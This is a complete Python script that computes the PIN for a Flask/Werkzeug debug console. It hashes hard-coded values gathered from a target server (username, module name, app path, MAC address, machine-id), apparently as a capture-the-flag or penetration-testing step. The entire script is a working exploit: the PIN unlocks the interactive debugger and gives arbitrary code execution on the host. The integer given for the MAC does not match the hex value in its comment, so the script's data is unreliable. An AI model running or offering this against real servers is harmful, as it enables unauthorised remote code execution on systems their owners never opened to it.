import hashlib
from itertools import chain

probably_public_bits = [
    'root',                          # username
    'flask.app',                     # modname
    'Flask',                         # getattr(app, '__name__', ...)
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # app file path
]

private_bits = [
    '2485377957890',      # MAC as int: int('0242ac140002', 16)
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # machine-id / cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    h.update(bit.encode('utf-8'))
    h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].lstrip('0') or '0'
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
